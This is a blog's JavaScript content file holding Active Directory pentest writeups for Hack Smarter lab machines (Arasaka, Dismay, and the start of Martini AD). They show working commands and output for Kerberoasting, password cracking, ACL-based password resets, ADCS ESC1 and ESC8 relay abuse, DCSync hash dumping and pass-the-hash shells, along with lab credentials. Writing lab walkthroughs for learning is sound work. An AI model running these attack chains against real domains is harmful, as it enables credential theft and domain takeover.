/* ===================================================================
   DORAEMON BLOG — CONTENT FILE
   This is the ONLY file you edit to add, change or remove content.
   After editing, commit and push to GitHub — that's your "publish".
   =================================================================== */

const ABOUT = {
  name: "Doraemon",
  bio: "Offensive security enthusiast documenting step-by-step solutions to Hack Smarter labs, covering Active Directory, Web, Linux, Windows and Cloud environments. My writeups show the full attack path, including the failed attempts.",
  links: [["Hack Smarter", "https://www.hacksmarter.org/learners/e18d9662-7163-458a-89c7-d62d9e8ca76d"]]
};

// Categories shown as filter chips on the Writeups page.
const CATS = ["Active Directory", "Web", "Windows", "Linux", "Cloud", "OSCP-LK", "Ranges"];
const DIFFS = ["Easy", "Medium", "Hard", "Insane"];

/* ---------- WRITEUPS ----------
   id: unique, used in the URL (#your-id). Letters, numbers, dashes only.
   body: Markdown. Supports # ## ### headings, - lists, **bold**,
         `inline code`, ```code blocks``` and ![alt](assets/path.png) images.
   files: optional downloadable attachments, e.g.
          [{name:"exploit.py", url:"assets/writeups/arasaka/exploit.py"}]
*/
const WRITEUPS = [
  {
    id: "arasaka-hsm",
    title: "Arasaka (Hack Smarter Labs)",
    ctf: "Hack Smarter Labs",
    cat: "Active Directory",
    diff: "Easy",
    pts: 0,
    date: "2026-04-17",
    summary: "An assumed-breach Active Directory pentest on Hack Smarter Labs, starting from a standard domain user.",
    files: [],
    body: `![Arasaka preview](assets/writeups/arasaka/preview.png)

## Objective / Scope

You are a member of the Hack Smarter Red Team. This penetration test will operate under an assumed breach scenario, starting with valid credentials for a standard domain user, faraday.

## Assumed breach credentials

\`\`\`
faraday:hacksmarter123
\`\`\`

## Reconnaissance

### Nmap scan

\`\`\`
Not shown: 987 filtered tcp ports (no-response)
PORT     STATE SERVICE       REASON          VERSION
53/tcp   open  domain        syn-ack ttl 126 Simple DNS Plus
88/tcp   open  kerberos-sec  syn-ack ttl 126 Microsoft Windows Kerberos (server time: 2026-04-25 14:33:10Z)
135/tcp  open  msrpc         syn-ack ttl 126 Microsoft Windows RPC
139/tcp  open  netbios-ssn   syn-ack ttl 126 Microsoft Windows netbios-ssn
389/tcp  open  ldap          syn-ack ttl 126 Microsoft Windows Active Directory LDAP (Domain: hacksmarter.local, Site: Default-First-Site-Name)
445/tcp  open  microsoft-ds? syn-ack ttl 126
464/tcp  open  kpasswd5?     syn-ack ttl 126
593/tcp  open  ncacn_http    syn-ack ttl 126 Microsoft Windows RPC over HTTP 1.0
636/tcp  open  ssl/ldap      syn-ack ttl 126 Microsoft Windows Active Directory LDAP (Domain: hacksmarter.local, Site: Default-First-Site-Name)
3268/tcp open  ldap          syn-ack ttl 126 Microsoft Windows Active Directory LDAP (Domain: hacksmarter.local, Site: Default-First-Site-Name)
3269/tcp open  ssl/ldap      syn-ack ttl 126 Microsoft Windows Active Directory LDAP (Domain: hacksmarter.local, Site: Default-First-Site-Name)
| rdp-ntlm-info:
|   Target_Name: HACKSMARTER
|   NetBIOS_Domain_Name: HACKSMARTER
|   NetBIOS_Computer_Name: DC01
|   DNS_Domain_Name: hacksmarter.local
|   DNS_Computer_Name: DC01.hacksmarter.local
|   Product_Version: 10.0.20348
|_  System_Time: 2026-04-25T14:34:01+00:00
5985/tcp open  http          syn-ack ttl 126 Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)

Host script results:
| smb2-security-mode:
|   3.1.1:
|_    Message signing enabled and required
\`\`\`

### Key findings

- The target is a domain controller: **DC01.hacksmarter.local** (domain \`hacksmarter.local\`, NetBIOS \`HACKSMARTER\`).
- Kerberos (88), LDAP/LDAPS (389, 636, 3268, 3269), SMB (445) and DNS (53) are exposed, which is the expected Active Directory attack surface.
- SMB signing is enabled and required, so SMB relay attacks are not an option.
- WinRM (5985) is open, which allows a remote shell once valid credentials are available.

## NetExec User Enumeration

Using the assumed breach credentials, I enumerated the domain users over SMB with NetExec.

\`\`\`
nxc smb 10.1.171.27 -u faraday -p hacksmarter123 --users
\`\`\`

\`\`\`
SMB  10.1.171.27  445  DC01  [*] Windows Server 2022 Build 20348 x64 (name:DC01) (domain:hacksmarter.local) (signing:True) (SMBv1:None) (Null Auth:True)
SMB  10.1.171.27  445  DC01  [+] hacksmarter.local\\faraday:hacksmarter123
SMB  10.1.171.27  445  DC01  -Username-        -Last PW Set-        -BadPW- -Description-
SMB  10.1.171.27  445  DC01  Administrator     2025-09-18 22:40:20  0       Built-in account for administering the computer/domain
SMB  10.1.171.27  445  DC01  Guest             <never>              0       Built-in account for guest access to the computer/domain
SMB  10.1.171.27  445  DC01  krbtgt            2025-09-21 02:51:44  0       Key Distribution Center Service Account
SMB  10.1.171.27  445  DC01  Goro              2025-09-21 15:00:31  0       Loyal to a fault
SMB  10.1.171.27  445  DC01  alt.svc           2025-09-21 15:07:42  0       Trapped for eternity
SMB  10.1.171.27  445  DC01  Yorinobu          2026-04-17 13:30:41  0
SMB  10.1.171.27  445  DC01  Hanako            2025-09-21 14:59:03  0       Waiting at embers
SMB  10.1.171.27  445  DC01  Faraday           2025-09-21 15:06:45  0
SMB  10.1.171.27  445  DC01  Smasher           2025-09-21 15:01:20  0
SMB  10.1.171.27  445  DC01  Soulkiller.svc    2025-09-21 15:30:13  0       Certificate managment for soulkiller AI
SMB  10.1.171.27  445  DC01  Hellman           2025-09-21 15:04:19  0
SMB  10.1.171.27  445  DC01  kei.svc           2025-09-21 15:05:16  0       Trapped for eternity
SMB  10.1.171.27  445  DC01  Silverhand.svc    2025-09-21 15:03:10  0       Trapped for eternity
SMB  10.1.171.27  445  DC01  Oda               2025-09-21 15:02:14  0
SMB  10.1.171.27  445  DC01  the_emperor       2025-11-06 17:19:03  0
SMB  10.1.171.27  445  DC01  [*] Enumerated 15 local users: HACKSMARTER
\`\`\`

### Key findings

- The \`faraday\` credentials are valid (\`[+]\`), and NetExec confirms the host is **Windows Server 2022 Build 20348** with SMB signing enabled.
- 15 domain users were returned, and all show 0 bad password attempts.
- Four accounts follow a \`.svc\` naming convention: \`alt.svc\`, \`Soulkiller.svc\`, \`kei.svc\` and \`Silverhand.svc\`. The description for \`Soulkiller.svc\` mentions certificate management.

## Kerberostable user

Next I queried the domain for accounts with a Service Principal Name (SPN) set, since those can be Kerberoasted. I used Impacket's \`GetUserSPNs.py\` with the \`faraday\` credentials.

\`\`\`
./GetUserSPNs.py hacksmarter.local/faraday:'hacksmarter123' -dc-ip 10.1.171.27
\`\`\`

\`\`\`
Impacket v0.14.0.dev0 - Copyright Fortra, LLC and its affiliated companies

ServicePrincipalName            Name     MemberOf  PasswordLastSet             LastLogon                   Delegation
------------------------------  -------  --------  --------------------------  --------------------------  ----------
AI/blackwall.hacksmarter.local  alt.svc            2025-09-21 15:07:42.894050  2026-04-17 13:47:56.116856
\`\`\`

### Key findings

- One Kerberoastable account was found: **alt.svc**, with the SPN \`AI/blackwall.hacksmarter.local\`.
- The account is not a member of any groups, has no delegation configured, and last logged on 2026-04-17.
- Its password was last set on 2025-09-21, so the password is the part that can be attacked offline.

## john hash.txt --wordlist=/usr/share/wordlists/rockyou.txt

With the Kerberoastable hash for \`alt.svc\` captured, I cracked it offline with John the Ripper against the rockyou wordlist.

\`\`\`
john hash.txt --wordlist=/usr/share/wordlists/rockyou.txt
\`\`\`

### Result

\`\`\`
alt.svc : babygirl1
\`\`\`

### Key findings

- The hash cracked quickly, which means \`alt.svc\`'s password, \`babygirl1\`, is a weak, dictionary-based password.
- This gives a foothold as \`alt.svc\` for further enumeration and privilege escalation.

## BloodHound Analysis

With credentials for \`alt.svc\`, I collected data with BloodHound to map out the attack path from here.

![BloodHound graph: alt.svc GenericAll on Yorinobu, Soulkiller.svc GenericWrite on Yorinobu](assets/writeups/arasaka/bloodhound-1.png)

### Key findings

- \`alt.svc\` has a **GenericAll** edge on \`Yorinobu@hacksmarter...\`, meaning \`alt.svc\` has full control over that user object (including resetting its password).
- \`Soulkiller.svc\` has a **GenericWrite** edge on the same \`Yorinobu\` account.
- \`Yorinobu\` is therefore the next pivot: owning \`alt.svc\` is enough to take over \`Yorinobu\` directly via GenericAll.

## Lateral Movement

Using the GenericAll permission \`alt.svc\` holds over \`Yorinobu\`, I abused it with bloodyAD to reset \`Yorinobu\`'s password directly.

\`\`\`
bloodyAD --host "10.1.171.27" -d "hacksmarter.local" -u "alt.svc" -p "babygirl1" set password 'YORINOBU' 'ghost_sec009'
\`\`\`

\`\`\`
[+] Password changed successfully!
\`\`\`

### Key findings

- The GenericAll edge from BloodHound was confirmed in practice: \`alt.svc\` could reset \`Yorinobu\`'s password without knowing the original one.
- \`Yorinobu\`'s credentials are now \`Yorinobu : ghost_sec009\`, giving a foothold as that user for the next step.

## Targeted Kerberoasting

With \`Yorinobu\`'s credentials, I ran a targeted Kerberoast against the domain to look for further roastable accounts.

\`\`\`
python3 targetedKerberoast.py --dc-host DC01.hacksmarter.local -d hacksmarter.local -u yorinobu -p 'ghost_sec009' -f john
\`\`\`

\`\`\`
[*] Starting kerberoast attacks
[*] Fetching usernames from Active Directory with LDAP
[+] Printing hash for (Soulkiller.svc)
Soulkiller.svc:$krb5tgs$23$*Soulkiller.svc$HACKSMARTER.LOCAL$hacksmarter.local/Soulkiller.svc*$e17fe21752980589707c598f9d7e4d1c$92a3cb0bc1696e82cf88130d77d32e1bc8464e535811411c474478275584114d26219999636c9b5be4b4af5ca72c57bda1a7c8912f80d692c40e9e9ce1e23a425c564113a508534baca277825eecab82bb139fa9a707967437a4e664bcdc26----<SNIP>-----
\`\`\`

### Key findings

- A TGS hash was recovered for **Soulkiller.svc**, the service account whose description mentioned certificate management back in the User Enumeration step.
- The hash is Kerberos 5 TGS-REP etype 23 (RC4), crackable offline the same way as the earlier \`alt.svc\` hash.

## Password cracking for Soulkiller.svc

\`\`\`
john hash.txt --wordlist=/usr/share/wordlists/rockyou.txt
\`\`\`

### Result

\`\`\`
MYpassword123#   (Soulkiller.svc)
\`\`\`

### Key findings

- The \`Soulkiller.svc\` hash cracked against rockyou, giving credentials \`Soulkiller.svc : MYpassword123#\`.
- Recall from the BloodHound Analysis step that \`Soulkiller.svc\` holds a **GenericWrite** edge on \`Yorinobu\`, and from the Targeted Kerberoasting intro that its description mentions certificate management — worth checking for ADCS abuse next.

## ADCS enumeration

With \`Soulkiller.svc\`'s credentials, I checked BloodHound for Active Directory Certificate Services (ADCS) abuse paths.

![BloodHound graph: Soulkiller.svc has Enroll rights on the AI_TAKEOVER certificate template](assets/writeups/arasaka/adcs-enum.png)

### Key findings

- \`Soulkiller.svc\` has an **Enroll** edge on the certificate template \`AI_TAKEOVER@HACKSMAR...\`, meaning it can request a certificate from this template.
- A certificate template reachable from a low-privileged, already-compromised account is a strong signal of an ESC-style ADCS misconfiguration, worth enumerating further before requesting a certificate.

## Certipy ADCS Enumeration

I used Certipy to enumerate the CA and certificate templates in detail as \`Soulkiller.svc\`.

\`\`\`
certipy-ad find -u 'SOULKILLER.svc@hacksmarter.local' -p 'MYpassword123#' -dc-ip 10.1.171.27 -stdout
\`\`\`

\`\`\`
Certificate Templates
  0
    Template Name                       : AI_Takeover
    Display Name                        : AI_Takeover
    Certificate Authorities             : hacksmarter-DC01-CA
    Enabled                             : True
    Client Authentication               : True
    Enrollee Supplies Subject           : True
    Certificate Name Flag               : EnrolleeSuppliesSubject
    Extended Key Usage                  : Client Authentication
                                          Secure Email
                                          Encrypting File System
    Permissions
      Enrollment Permissions
        Enrollment Rights               : HACKSMARTER.LOCAL\\Soulkiller.svc
                                          HACKSMARTER.LOCAL\\Domain Admins
                                          HACKSMARTER.LOCAL\\Enterprise Admins
    [+] User Enrollable Principals       : HACKSMARTER.LOCAL\\Soulkiller.svc
    [!] Vulnerabilities
      ESC1                               : Enrollee supplies subject and template allows client authentication.
\`\`\`

### Key findings

- The \`AI_Takeover\` certificate template is vulnerable to **ESC1**: it lets the enrollee supply their own subject name (\`EnrolleeSuppliesSubject\`) and allows client authentication.
- \`Soulkiller.svc\` is explicitly listed in the template's Enrollment Rights, matching the Enroll edge seen in BloodHound.
- This combination means \`Soulkiller.svc\` can request a certificate for the \`AI_Takeover\` template while specifying an arbitrary subject — such as a Domain Admin's UPN — and use the resulting certificate to authenticate as that principal.

## ESC1 Exploitation

With the ESC1 misconfiguration confirmed, I requested a certificate as \`Soulkiller.svc\` while setting the UPN to \`THE_EMPEROR\`, a high-value account found during user enumeration.

\`\`\`
certipy-ad req -u 'SOULKILLER.svc@hacksmarter.local' -p "MYpassword123#" -dc-ip "10.1.171.27" -ca 'hacksmarter-DC01-CA' -template 'AI_Takeover' -upn 'THE_EMPEROR' -target 'DC01.hacksmarter.local' -key-size 4096
\`\`\`

\`\`\`
Certipy v5.0.4 - by Oliver Lyak (ly4k)

[*] Requesting certificate via RPC
[*] Request ID is 7
[*] Successfully requested certificate
[*] Got certificate with UPN 'THE_EMPEROR'
[*] Certificate has no object SID
[*] Saving certificate and private key to 'the_emperor.pfx'
[*] Wrote certificate and private key to 'the_emperor.pfx'
\`\`\`

### Key findings

- The ESC1 abuse worked: a certificate was issued for the \`THE_EMPEROR\` UPN while authenticating as \`Soulkiller.svc\`, and saved as \`the_emperor.pfx\`.
- Certipy's warning that the certificate "has no object SID" means the cert maps only by UPN, so the next step is to authenticate with this certificate (via PKINIT/Kerberos) to obtain a TGT and NTLM hash as \`the_emperor\`.

\`\`\`
export KRB5CCNAME=THE_EMPEROR@10.1.171.27.ccache
klist
Ticket cache: FILE:THE_EMPEROR@10.1.171.27.ccache
Default principal: THE_EMPEROR@HACKSMARTER.LOCAL

Valid starting     Expires            Service principal
17/04/26 14:18:09  18/04/26 00:18:09  krbtgt/HACKSMARTER.LOCAL@HACKSMARTER.LOCAL
        renew until 18/04/26 14:18:09
\`\`\`

**THE_EMPEROR compromised.**

\`\`\`
evil-winrm -u THE_EMPEROR -H 'd87640b0d83dc7f90f5f30bd6789b133' -i 10.1.171.27

Evil-WinRM shell v3.9

*Evil-WinRM* PS C:\\Users\\the_emperor\\Documents>
\`\`\`

![Evil-WinRM shell as the_emperor](assets/writeups/arasaka/evil-winrm.png)
`
  },


{
  id: "Dismay-hsm",
  title: "Dismay (Hack Smarter Labs)",
  ctf: "Hack Smarter labs",
  cat: "Active Directory",
  diff: "Hard",
  pts: 0,
  date: "2026-04-27",
  summary: "An assumed-breach, multi-machine Active Directory penetration test involving Nexus, DC1 and DC2, culminating in full domain compromise.",

  body: `![Dismay preview](assets/writeups/Dismay/dismay.png)

## Scope/Objective

You have been assigned a penetration test of a client’s internal network. There are three different servers in-scope. Your task is to identify all vulnerabilities and demonstrate impact to the client by elevating your access to Domain Admin. The client has provided you VPN access and Active Directory credentials (below) for the engagement.

## Initial creds

\`\`\`text
Username: xiao.ge
Password: AmBZATVjnH4qo8H4
\`\`\`

## Enumerating Nexus

Target IP: \`10.1.107.228\`

## NMAP

\`\`\`text
80/tcp   open  http          Microsoft IIS httpd 10.0
135/tcp  open  msrpc
139/tcp  open  netbios-ssn
445/tcp  open  microsoft-ds
3389/tcp open  ms-wbt-server
5985/tcp open  http          Microsoft HTTPAPI httpd 2.0

Target_Name: EC2AMAZ-GQCP864
NetBIOS_Domain_Name: EC2AMAZ-GQCP864
NetBIOS_Computer_Name: EC2AMAZ-GQCP864
DNS_Domain_Name: EC2AMAZ-GQCP864
DNS_Computer_Name: EC2AMAZ-GQCP864
Product_Version: 10.0.20348

SMB signing enabled but not required.
\`\`\`

Nexus isn't a domain-joined computer but just a Windows workstation.

### NetExec SMB Enumeration

\`\`\`text
nxc smb 10.1.107.228 -u xiao.ge -p 'AmBZATVjnH4qo8H4' --shares

SMB  10.1.107.228  445  EC2AMAZ-GQCP864  [*] Windows Server 2022 Build 20348 x64
SMB  10.1.107.228  445  EC2AMAZ-GQCP864  [+] EC2AMAZ-GQCP864\\xiao.ge:AmBZATVjnH4qo8H4

Share                    Permissions
-----                    -----------
ADMIN$                   Remote Admin
C$                       Default share
IPC$                     READ
UpdateServicesPackages   READ
WsusContent              READ
WSUSTemp
\`\`\`

## Interesting shares

\`\`\`text
WSUSTemp
WsusContent
UpdateServicesPackages
\`\`\`

## XFreeRDP to Get an RDP Shell for xiao.ge

![XFreeRDP RDP session for xiao.ge](assets/writeups/Dismay/RDP-Xiaoge.png)

\`\`\`text
PS> These files were originally in the Recycle bin but i restored them
\`\`\`

## Meeting_Notes_Archive

![Meeting Notes Archive](assets/writeups/Dismay/meeting_notes_archive.png)

## Invoice_Drafts

![Invoice Drafts](assets/writeups/Dismay/invoice_draft.png)

## Temporary Credentials

\`\`\`text
staging_admin : Spring_2026_Temp!
\`\`\`

## System_Audit_Log

![System Audit Log](assets/writeups/Dismay/system_audit_log.png)

## Confidential.7z

![Confidential 7z](assets/writeups/Dismay/confidential_7z.png)

\`\`\`text
This was password protected but the temporary creds worked here
\`\`\`

![Guy Rooki Password](assets/writeups/Dismay/guy_rooki_pass.png)

## Hardcoded credentials for guy.rookie found

\`\`\`text
guy.rookie : O0Aco9FQJQ
\`\`\`

## Foothold as guy.rookie

With the recovered credentials, I moved on to verifying whether the account could authenticate against the domain controllers.

### NetExec Verification

\`\`\`text
nxc smb ip.txt -u guy.rookie -p 'O0Aco9FQJQ'

SMB  10.1.44.140   445  DC1  [*] Windows Server 2022 Build 20348 x64
SMB  10.1.251.13   445  DC2  [*] Windows Server 2022 Build 20348 x64
SMB  10.1.107.228  445  EC2AMAZ-GQCP864

SMB  10.1.44.140   445  DC1  [+] dismay.hsm\\guy.rookie:O0Aco9FQJQ
SMB  10.1.251.13  445  DC2  [+] dismay.hsm\\guy.rookie:O0Aco9FQJQ
SMB  10.1.107.228 445  EC2AMAZ-GQCP864 [-] STATUS_LOGON_FAILURE
\`\`\`

## Successful host authentication

\`\`\`text
DC1.dismay.hsm : 10.1.44.140
DC2.dismay.hsm : 10.1.251.13
\`\`\`

## NetExec SMB Shares enumeration on DC1 & DC2

### NMAP for DC1.DISMAY.HSM

\`\`\`text
53/tcp   open  domain
88/tcp   open  kerberos-sec
135/tcp  open  msrpc
139/tcp  open  netbios-ssn
389/tcp  open  ldap
445/tcp  open  microsoft-ds
464/tcp  open  kpasswd5
593/tcp  open  ncacn_http
636/tcp  open  ssl/ldap
3268/tcp open  ldap
3269/tcp open  ssl/ldap
3389/tcp open  ms-wbt-server
5985/tcp open  http

Target_Name: DISMAY
NetBIOS_Domain_Name: DISMAY
NetBIOS_Computer_Name: DC1
DNS_Domain_Name: dismay.hsm
DNS_Computer_Name: DC1.dismay.hsm
Product_Version: 10.0.20348

SMB signing enabled and required.
\`\`\`

### NMAP for DC2.DISMAY.HSM

\`\`\`text
53/tcp   open  domain
80/tcp   open  http
88/tcp   open  kerberos-sec
135/tcp  open  msrpc
139/tcp  open  netbios-ssn
389/tcp  open  ldap
443/tcp  open  https
445/tcp  open  microsoft-ds
464/tcp  open  kpasswd5
593/tcp  open  ncacn_http
636/tcp  open  ssl/ldap
3268/tcp open  ldap
3269/tcp open  ssl/ldap
3389/tcp open  ms-wbt-server
5985/tcp open  http

Target_Name: DISMAY
NetBIOS_Domain_Name: DISMAY
NetBIOS_Computer_Name: DC2
DNS_Domain_Name: dismay.hsm
DNS_Computer_Name: DC2.dismay.hsm
Product_Version: 10.0.20348

SMB signing enabled and required.
\`\`\`

### NetExec SMB Shares

\`\`\`text
nxc smb ip.txt -u guy.rookie -p 'O0Aco9FQJQ' --shares

DC2:
ADMIN$
C$
CertEnroll       READ
IPC$             READ
NETLOGON         READ
SYSVOL           READ

DC1:
ADMIN$
C$
IPC$              READ
NETLOGON          READ
SYSVOL            READ
Tools
\`\`\`

## NetExec User Enumeration

\`\`\`text
nxc smb DC1.dismay.hsm -u guy.rookie -p 'O0Aco9FQJQ' --users-export DC1_users.txt

SMB  10.1.44.140  445  DC1  [+] dismay.hsm\\guy.rookie:O0Aco9FQJQ

-Username-        -Last PW Set-       -BadPW- -Description-
Administrator     2026-02-05 09:16:49  0       Built-in account
Guest             <never>             0       Built-in guest account
krbtgt            2025-12-12 11:50:45  0       Key Distribution Center Service Account
mike.silver       2026-02-08 10:39:00  0
wang.kali         2026-02-08 10:40:19  0
nadia.robin       2026-02-08 10:39:15  0
jena.yamazaki     2026-02-08 10:39:30  0
guy.rookie        2026-02-08 10:39:43  0

[*] Enumerated 8 local users: DISMAY
[*] Writing 8 local users to DC1_users.txt
\`\`\`

## Discovered Users

\`\`\`text
Administrator
Guest
krbtgt
mike.silver
wang.kali
nadia.robin
jena.yamazaki
guy.rookie
\`\`\`

## LOOT collection

I used RustHound-CE to collect Active Directory information for BloodHound analysis.

\`\`\`text
rusthound-ce -d dismay.hsm -u guy.rookie -p 'O0Aco9FQJQ' -i 10.1.44.140 -f DC1.dismay.hsm -c All

[INFO] Connected to DISMAY.HSM Active Directory!
[INFO] Starting data collection...
[INFO] All data collected for NamingContext DC=dismay,DC=hsm
[INFO] All data collected for NamingContext CN=Configuration,DC=dismay,DC=hsm
[INFO] All data collected for NamingContext CN=Schema,CN=Configuration,DC=dismay,DC=hsm
[INFO] All data collected for NamingContext DC=DomainDnsZones,DC=dismay,DC=hsm
[INFO] All data collected for NamingContext DC=ForestDnsZones,DC=dismay,DC=hsm

[INFO] MachineAccountQuota: 10
[INFO] Found 11 enabled certificate templates

9 users parsed!
67 groups parsed!
2 computers parsed!
1 ous parsed!
1 domains parsed!
3 gpos parsed!
74 containers parsed!
1 ntauthstores parsed!
1 aiacas parsed!
1 rootcas parsed!
1 enterprisecas parsed!
33 certtemplates parsed!
3 issuancepolicies parsed!

RustHound-CE Enumeration Completed!
\`\`\`

## BloodHound Analysis

![BloodHound Analysis - Initial graph](assets/writeups/Dismay/BH1.png)

Changing password for \`JENA.YAMAZAKI\`.

\`\`\`text
bloodyAD --host "10.1.44.140" -d "dismay.hsm" -u "guy.rookie" -p "O0Aco9FQJQ" set password 'jena.yamazaki' 'ghost_sec009'

[+] Password changed successfully!
\`\`\`

## Verification using NXC

\`\`\`text
nxc smb 10.1.44.140 -u jena.yamazaki -p ghost_sec009

SMB  10.1.44.140  445  DC1  [+] dismay.hsm\\jena.yamazaki:ghost_sec009
\`\`\`

Changing password for \`Mike.Silver\`.

\`\`\`text
bloodyAD --host "10.1.44.140" -d "dismay.hsm" -u "jena.yamazaki" -p "ghost_sec009" set password 'mike.silver' 'HackSmarter123'

[+] Password changed successfully!
\`\`\`

### RDP Authentication allowed for jena.yamazaki

\`\`\`text
nxc rdp ip.txt -u jena.yamazaki -p ghost_sec009

DC1  [+] dismay.hsm\\jena.yamazaki:ghost_sec009
DC2  [+] dismay.hsm\\jena.yamazaki:ghost_sec009
\`\`\`

\`\`\`text
nxc rdp ip.txt -u mike.silver -p HackSmarter123

DC2  [+] dismay.hsm\\mike.silver:HackSmarter123
DC1  [+] dismay.hsm\\mike.silver:HackSmarter123
\`\`\`

## Mike.silver has the AddMember ACL set.

![BloodHound - Mike.silver AddMember ACL](assets/writeups/Dismay/BH2.png)

\`\`\`text
bloodyAD --host "10.1.44.140" -d "dismay.hsm" -u "mike.silver" -p "HackSmarter123" add groupMember 'SHARES_OPERATORS' 'mike.silver'

[+] mike.silver added to SHARES_OPERATORS
\`\`\`

Now we have \`READ & WRITE\` access to the \`TOOLS\` share in DC1.

### NetExec SMB Share enumeration

\`\`\`text
nxc smb ip.txt -u mike.silver -p HackSmarter123 --shares

DC1:
ADMIN$
C$
IPC$             READ
NETLOGON         READ
SYSVOL           READ
Tools            READ,WRITE
\`\`\`

### NetExec SMB Share Tools enumeration

\`\`\`text
smbclient //10.1.44.140/Tools/ -U mike.silver

Password for [WORKGROUP\\mike.silver]:

smb: \\> ls

Dism.exe
mspaint.exe
note.txt
notepad.exe
osk.exe
\`\`\`

## Note.txt

\`\`\`text
From: Adrian Thompson <adrian.thompson@dismay.hsm>
To: Kali Wang <wang.kali@dismay.hsm>
Subject: FINAL WARNING - Fix that broken executable NOW

Kali,

This is the third time this month. The binary you deployed last Thursday is completely broken. Users are screaming, auditors are asking questions, and I'm the one getting heat from upstairs. HR is already on standby. I've had it with your "it works on my machine" excuses.

You have until 17:00 tomorrow to deliver a working file or you're done.

Get it fixed, push the new file. No more chances.

I'm not bluffing.

- Adrian
IT Security Administrator
DISMAY Ltd.
\`\`\`

## ADCS Vulnerability ESC8 — Abusing ADCS via NTLM relaying

I enumerated the certificate authority and certificate templates using Certipy.

\`\`\`text
certipy-ad find -u 'mike.silver@dismay.hsm' -p 'HackSmarter123' -dc-ip 10.1.251.13 -stdout

[*] Finding certificate templates
[*] Found 33 certificate templates
[*] Finding certificate authorities
[*] Found 1 certificate authority
[*] Found 11 enabled certificate templates

CA Name: dismay-DC2-CA
DNS Name: DC2.dismay.hsm

Web Enrollment:
  HTTP Enabled: True
  HTTPS Enabled: False

User Specified SAN: Disabled
Request Disposition: Issue
Enforce Encryption for Requests: Enabled

Enrollment:
  DISMAY.HSM\\Authenticated Users

[!] Vulnerabilities
  ESC8: Web Enrollment is enabled over HTTP.
\`\`\`

### Checking the Certificate Web Enrollment endpoint

## DC2:10.1.251.13

\`\`\`text
curl -s -I http://10.1.251.13/certsrv/certfnsh.asp

HTTP/1.1 401 Unauthorized
Content-Length: 1293
Content-Type: text/html
Server: Microsoft-IIS/10.0
WWW-Authenticate: Negotiate
WWW-Authenticate: NTLM
\`\`\`

\`\`\`text
coercer coerce -u mike.silver -p HackSmarter123 -l 10.200.51.102 -t 10.1.44.140 --always-continue
       ______
      / ____/___  ___  _____________  _____
     / /   / __ \/ _ \/ ___/ ___/ _ \/ ___/
    / /___/ /_/ /  __/ /  / /__/  __/ /      v2.4.3
    \____/\____/\___/_/   \___/\___/_/       by @podalirius_
\`\`\`

\`\`\`text
./ntlmrelayx.py -t http://DC2.dismay.hsm/certsrv/certfnsh.asp -smb2support --adcs --template KerberosAuthentication --no-http-server --no-wcf-server --no-raw-server
\`\`\`

### Hash for DC1

\`\`\`text
certipy-ad auth -pfx DC1.pfx -dc-ip 10.1.251.13

Certipy v5.0.4

[*] Certificate identities:
[*] SAN DNS Host Name: 'DC1.dismay.hsm'
[*] SAN DNS Host Name: 'dismay.hsm'
[*] SAN DNS Host Name: 'DISMAY'
[*] Security Extension SID: 'S-1-5-21-1359501962-4064634841-3558559731-1000'

[*] Found multiple identities in certificate

[0] DNS Host Name: 'DC1.dismay.hsm' (DC1$@dismay.hsm)
[1] DNS Host Name: 'dismay.hsm' (dismay$@hsm)
[2] DNS Host Name: 'DISMAY' (DISMAY@unknown)

> 0

[*] Using principal: 'dc1$@dismay.hsm'
[*] Trying to get TGT...
[*] Got TGT
[*] Saving credential cache to 'dc1.ccache'
[*] Wrote credential cache to 'dc1.ccache'
[*] Trying to retrieve NT hash for 'dc1$'

[*] Got hash for 'dc1$@dismay.hsm':
aad3b435b51404eeaad3b435b51404ee:07051010977116b587c2b52b40f14ac0
\`\`\`

## DCsync Attack

### DCsync Successfull

\`\`\`text
impacket-secretsdump dismay.hsm/'dc1$'@dismay.hsm -hashes 'aad3b435b51404eeaad3b435b51404ee:07051010977116b587c2b52b40f14ac0'

Impacket v0.14.0.dev0

[-] RemoteOperations failed: DCERPC Runtime Error: code: 0x5 - rpc_s_access_denied
[*] Dumping Domain Credentials (domain\\uid:rid:lmhash:nthash)
[*] Using the DRSUAPI method to get NTDS.DIT secrets

Administrator:500:aad3b435b51404eeaad3b435b51404ee:b20bd68c786d847c122ed2b1e8ab60b0:::
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
krbtgt:502:aad3b435b51404eeaad3b435b51404ee:746e5739a93cf20f26f6952227a3c321:::

dismay.hsm\\mike.silver:1108:aad3b435b51404eeaad3b435b51404ee:a908eaeebad5fc442b6c699cdc1fec88:::
dismay.hsm\\wang.kali:1109:aad3b435b51404eeaad3b435b51404ee:3c96bcb2622d45fc301fd72ba3004dd9:::
dismay.hsm\\nadia.robin:1110:aad3b435b51404eeaad3b435b51404ee:bd0ff5e06c9ccec992bb8f96d986effb:::
dismay.hsm\\jena.yamazaki:1111:aad3b435b51404eeaad3b435b51404ee:84be2919ce5f1544b04d61146f07acaa:::
dismay.hsm\\guy.rookie:1112:aad3b435b51404eeaad3b435b51404ee:bfbb44b71a8f029be27d12097fe84d0b:::

DC1$:1000:aad3b435b51404eeaad3b435b51404ee:07051010977116b587c2b52b40f14ac0:::
DC2$:1114:aad3b435b51404eeaad3b435b51404ee:3b4b4a869f93f6e67ae0450bdd1c73e1:::

[*] Kerberos keys grabbed
[*] Cleaning up...
\`\`\`

## Administrator Hash

\`\`\`text
Administrator:500:aad3b435b51404eeaad3b435b51404ee:b20bd68c786d847c122ed2b1e8ab60b0
\`\`\`

## Full Domain Compromise 👑

\`\`\`text
*Evil-WinRM* PS C:\\Users\\Administrator\\Documents> whoami

dismay\\administrator

*Evil-WinRM* PS C:\\Users\\Administrator\\Documents>
\`\`\`

![Dismay Certificate of Completion](assets/writeups/Dismay/cert.png)
`
},

{
  id: "martini-ad",
  title: "Martini AD (Hack Smarter Labs)",
  ctf: "Hack Smarter Labs",
  cat: "Active Directory",
  diff: "Easy",
  pts: 0,
  date: "2026-10-24",
  summary: "An internal black-box Active Directory assessment that moves from guest SMB enumeration to domain compromise through exposed notes, Kerberoasting, credential reuse and DCSync.",
  files: [],
  body: `![Martini AD preview](assets/writeups/martiniAD/preview.png)

## Scope / Objective

Martini Bars engaged the Hack Smarter team to perform an internal black-box penetration test at one of its branch offices following a corporate breach. VPN access was provided, but no domain credentials were supplied.

## Nmap Enumeration

The initial scan identified the target at \`10.1.253.173\` and exposed a typical Active Directory service set, including DNS, Kerberos, LDAP, SMB, MSRPC, RDP and WinRM.

\`\`\`bash
nmap -sCV 10.1.253.173 -vv
\`\`\`

